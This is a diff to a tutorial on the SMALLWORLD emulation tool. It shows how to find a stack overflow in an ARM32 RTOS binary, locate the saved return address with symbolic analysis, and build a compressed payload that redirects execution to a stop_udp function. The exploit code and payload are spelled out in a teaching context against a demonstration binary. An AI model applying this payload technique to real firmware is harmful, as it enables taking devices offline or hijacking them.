@@ -266,87 +266,81 @@ After stack memory: <BV32768 mem_6000_19_32768>
 ```
 
 Similarly to our first case, bytes preceded with `'8'` are repeated 8 times. However, we can also see that the top byte of `input_buffer`, which was preceded by `'3'`, is repeated 3 times. This suggests the code may hold this behavior for any numeric character.
-## Exploit Development (WORK IN PROGRESS)
-*The `rtos_3_exploit.py` script is included for reference with this section.*
+## Exploit Development
+*The `rtos_3_find_lr.py` and `rtos_4_exploit.py` scripts are included for reference with this section.*
 
 Now that we have an understanding of the vulnerability present in the binary, SMALLWORLD can become a powerful tool for rapid exploit development.
-### Buffer Overflow
+### Find Return Address in Stack
 As we observed in the previous section, certain inputs will overflow the end of the `input_buffer` and allow for arbitrary writes to the stack memory. Therefore, we can overwrite the function's return address to gain control of the program. For this demonstration, our goal will be to reach the `stop_udp` function.
 
-~~Let's start by pinpointing where exactly in our stack the `lr` register gets written to. This register holds the original return address for our function, is pushed to the stack, and then is popped from the stack to `pc` when the function returns. We can find use angr to determine which section of the stack holds this address.~~
+Let's start by pinpointing where exactly in our stack the `lr` register gets written to. This register holds the original return address for our function, is pushed to the stack, and then is popped from the stack to `pc` when the function returns. We can find use angr to determine which bits of the stack hold this address.
 
-
-
-
-
-In this case, a quick review of the source code reveals a stack-allocated buffer `temp` which may be subject to improper bounds checking. Notably, our earlier test string `b"8a8b..."` allowed us to compress 16 bytes of data into just 4 bytes of input. Perhaps this could be used to perform an out-of-bounds write past the end of the buffer? We can easily test this idea.
-
-Let's start with an input that may expand to 4 bytes past the end of the buffer. Then, after our harness executes, we can read the memory from our emulator between the stack pointer `sp` and bottom of the stack `0x6000` to see if this memory was affected.
+Firstly, we should change our input such that it won't overflow the buffer. Let's use the non-crashing input buffer from our original harness.
 
 ```python
-input_bytes = b"8a8b4c\0\0\0\0\0\0\0\0\0\0"
-
-... # execution step here
-
-# Print stack
-cpu.sp.extract(emulator)
-stack_memory = emulator.read_memory(cpu.sp.get(), 0x6000-cpu.sp.get())
-print(stack_memory)
+input_bytes = b"abcdefghijklmnop"
 ```
 
-As expected, we have overflowed our 16-byte buffer and can now write arbitrary data to the stack. Just past our set `exit_point`, this memory will be popped from the stack back into registers. We can use this to gain control over the program.
-
-```plaintext
-emulation complete; encountered exit point or went out of bounds
-b'AAAAAAAABBBBBBBBcccc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-```
-
-### Overwrite Return Address
-The value which was previously pushed to the stack from the link register (`lr`) will be popped to the program counter register (`pc`). Therefore, we can determine exactly which memory region will be popped to `pc` by setting the value of `lr` to something distinct and observing it in the stack.
+Then, we must label our input register `lr` so that we can determine where it appears in the stack, just as we did before with our input buffer.
 
 ```python
-cpu.lr.set(0xFFFFFFFF) # Before execution
+cpu.lr.set_label("lr")
 ```
 
-```plaintext
-emulation complete; encountered exit point or went out of bounds
-b'AAAAAAAABBBBBBBBcccc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff'
+Finally, we can remove any unneeded debugging information that we were printing before, leaving just the symbolic stack memory. When we execute this analysis, we see that the resulting bitvector is full of logic in this case, giving some insight into the complexity of the code under analysis. More importantly, we can pinpoint exactly where `lr` ended up — the top 32 bits of the stack.
+
+```
+...
+(if ((if (0#24 .. input_buffer[7:0]) - 0x61 >= 0x19 then 0x1 else 0x0) & ~(0#31 .. (if input_buffer[7:0] == 122 then 1 else 0))) != 0x1 then (if ((if (0#24 .. input_buffer[7:0]) - 0x61 >= 0x19 then 0x1 else 0x0) & ~(0#31 .. (if input_buffer[7:0] == 122 then 1 else 0))) != 0x1 then (0#24 .. input_buffer[7:0]) - 0x20 else (0#24 .. input_buffer[7:0]))[7:0] else input_buffer[7:0]) .. Reverse(reg_18_5_32) .. Reverse(reg_1c_4_32) .. Reverse(reg_20_3_32) .. Reverse(reg_24_2_32) .. Reverse(reg_28_1_32) .. Reverse(lr)>
 ```
 
-This reveals that there are exactly 24 bytes between the end of the buffer and the beginning of the return address on the stack. Therefore, we can overwrite the return address by preparing a 16-byte payload which expands to:
-1. 16 bytes to overwrite buffer
-2. 24 bytes to overwrite function arguments and local variables
-3. 4 bytes to overwrite return address
+### Constructing a Payload
+Having found that `lr` takes up the top 4 bytes of the stack, and know that `input_buffer` starts 40 bytes below the top of the stack, we can determine that our payload must include 36 bytes of padding followed by our desired 4-byte return address.
 
-For this example, we will point `pc` at the function `stop_udp(void)` to take the server offline. We can update `exit_point` to use this function's address and create a payload as shown below.
+To compress 36 bytes into the first 12 bytes of `input_buffer`, we can take advantage of the expanding behavior discovered during dynamic analysis. The 8-byte expression `b"8a8b8c8d"` will expand to 32 bytes when processed. The remaining 4 bytes of padding can be any non-numeric character. Afterwards, we can include the address of `stop_udp`, which should be marked as our exit point.
 
 ```python
+# Entry point / exit point
+entry_point = code.get_symbol_value("smallworld_bug")
 stop_udp_addr = code.get_symbol_value("stop_udp")
 exit_point = stop_udp_addr
+cpu.pc.set(entry_point)
+emulator.add_exit_point(exit_point)
 
 ...
 
+# Input buffer
+buffer_memory_address = 0x1000
 input_bytes = b"8a8b8c8d\0\0\0\0" + stop_udp_addr.to_bytes(
-	4, code.platform.byteorder.value
+    4, code.platform.byteorder.value
 )
+buffer_memory = smallworld.state.memory.RawMemory.from_bytes(
+    input_bytes, buffer_memory_address
+)
+```
 
-... # execution step here
+Additionally, we can confirm that our harness reaches `stop_udp` by checking the value of `pc` after executing our harness.
 
+```python
 # Reached stop_udp?
 cpu.pc.extract(emulator)
 print(f"PC: {hex(cpu.pc.get())}")
 print(f"Reached stop_udp: {cpu.pc.get() == stop_udp_addr}")
 ```
 
-This harness successfully overwrites `pc` and hits our `stop_udp` exit point!
+Lastly, we should return to using the Unicorn emulator, since we only need concrete execution.
 
-```plaintext
-emulation complete; encountered exit point or went out of bounds
-Buffer: b'AAAAAAAABBBBBBBB'
-Stack memory: b''
-PC: 0x1024e4
+```python
+# Emulator
+emulator = smallworld.emulators.UnicornEmulator(code.platform)
+```
+
+Executing this harness results in control flow successfully being passed to `stop_udp`!
+
+```
+PC: 0x1027c4
 Reached stop_udp: True
 ```
 
 ## Conclusion
-Smallworld provides unique abilities as a dynamic analysis tool when applied to RTOS systems. Small regions of code can easily be harnessed for analysis, debugging, testing, fuzzing, etc. without any dependence on physical hardware or non-local program state.
+SMALLWORLD provides a uniquely detailed level of control over emulated execution environments, making it an ideal choice for harnessing, fuzzing, and analyzing specific areas of interest within binaries for nearly any platform. In this tutorial, we demonstrated these capabilities against an ARM32 RTOS binary by discovering, investigating, and exploiting a vulnerable function with no need for hardware in the loop.
